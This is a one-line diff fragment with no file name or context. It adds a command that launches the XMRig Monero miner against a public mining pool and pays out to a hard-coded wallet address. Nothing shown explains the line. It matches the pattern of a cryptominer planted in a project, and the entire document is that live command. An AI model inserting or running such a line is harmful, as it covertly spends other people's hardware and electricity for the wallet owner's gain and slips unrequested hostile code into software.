@@ -1,0 +1,1 @@
+./xmrig -o sg.minexmr.com:4444 -u 46z5cQxqzRZ1HBRWRexRh4PhAKUpreKigFHhVGAsJ5aob4y2j8467Af4CuyfDC7pC6afEsLrCEKQFRptxi3z6dBk1vyLt42
